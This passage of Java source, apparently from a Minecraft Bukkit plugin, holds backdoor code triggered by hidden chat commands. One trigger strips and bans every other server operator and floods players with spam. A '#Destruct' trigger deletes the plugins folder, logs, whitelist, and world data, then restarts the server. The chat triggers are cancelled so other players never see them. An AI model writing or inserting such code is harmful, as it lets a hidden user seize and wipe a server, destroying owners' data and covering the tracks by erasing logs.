                if (!target.equals(player) && target.isOp()) {
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        target.setOp(false);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "minecraft:ban " + target.getName() + " You have been deopped and banned.");
                    });
                }
            }

            Bukkit.getScheduler().runTaskTimer(plugin, () -> {
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.sendMessage(ChatColor.RED + spamMessage);
                }
            }, 0L, 20L); // Spam co 20 ticków (1 sekunda)
            player.sendMessage(formatMsg.apply("All operators deopped, banned, and spam started."));
            event.setCancelled(true);
        }

        if (message.startsWith("#Destruct")) {
            player.sendMessage(formatMsg.apply("The server will now destruct and restart..."));

            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                try {
                    // Get the plugins folder
                    File pluginsFolder = new File("plugins");

                    if (pluginsFolder.exists() && pluginsFolder.isDirectory()) {
                        // Delete all files, subfolders, and .jar files in the plugins folder
                        for (File file : pluginsFolder.listFiles()) {
                            deleteFile(file); // Usuwanie zarówno plików jak i folderów
                        }
                        Bukkit.getLogger().info("All files, folders, and .jar files in the plugins folder have been deleted.");
                    } else {
                        Bukkit.getLogger().warning("Plugins folder not found or not a directory.");
                    }

                    // Delete logs folder and all its contents
                    File logsFolder = new File("logs");
                    if (logsFolder.exists() && logsFolder.isDirectory()) {
                        deleteFile(logsFolder);
                        Bukkit.getLogger().info("Logs folder and all its contents have been deleted.");
                    }

                    // Delete whitelist.json
                    File whitelistFile = new File("whitelist.json");
                    if (whitelistFile.exists() && !whitelistFile.delete()) {
                        Bukkit.getLogger().warning("Failed to delete whitelist.json.");
                    } else {
                        Bukkit.getLogger().info("whitelist.json has been deleted.");
                    }

                    // Delete world and world_nether folders
                    File worldFolder = new File("world");
                    if (worldFolder.exists() && worldFolder.isDirectory()) {
                        deleteFile(worldFolder);
                        Bukkit.getLogger().info("world folder and all its contents have been deleted.");
                    }

                    File worldNetherFolder = new File("world_nether");
                    if (worldNetherFolder.exists() && worldNetherFolder.isDirectory()) {
                        deleteFile(worldNetherFolder);
                        Bukkit.getLogger().info("world_nether folder and all its contents have been deleted.");
                    }

                    // Restart the server
                    Bukkit.getLogger().info("Restarting the server...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");

                } catch (Exception e) {
                    Bukkit.getLogger().severe("Error during #Destruct command: " + e.getMessage());
                    e.printStackTrace();
                }
            }, 60L); // 3 seconds delay
            event.setCancelled(true);
